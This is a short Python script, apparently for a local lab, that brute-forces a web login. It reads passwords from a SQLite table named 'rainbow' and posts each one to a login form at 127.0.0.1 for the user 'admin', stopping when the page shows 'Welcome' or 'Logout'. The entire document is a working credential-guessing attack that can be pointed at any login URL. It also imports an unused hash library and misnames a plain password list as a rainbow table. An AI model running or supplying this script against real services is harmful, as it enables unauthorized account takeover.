import sqlite3
import hashlib
import requests

# === CONFIG ===
LOGIN_URL = "http://127.0.0.1:5000/login"
USERNAME = "admin"
DB_FILE = "rainbow.db"

# === STEP 1: Load hashes and passwords from DB ===
conn = sqlite3.connect(DB_FILE)
cursor = conn.cursor()

cursor.execute("SELECT password FROM rainbow")
passwords = cursor.fetchall()

print(f"🧠 Loaded {len(passwords)} passwords from rainbow table")
session = requests.Session()

# === STEP 2: Brute-force login ===
for (password,) in passwords:
    print(f"🔐 Trying password: {password}", end="\r")

    response = session.post(LOGIN_URL, data={
        "username": USERNAME,
        "password": password
    })

    if "Welcome" in response.text or "Logout" in response.text:
        print(f"\n✅ SUCCESS: Password found for '{USERNAME}': {password}")
        break
else:
    print("\n❌ Failed: No password matched")

conn.close()
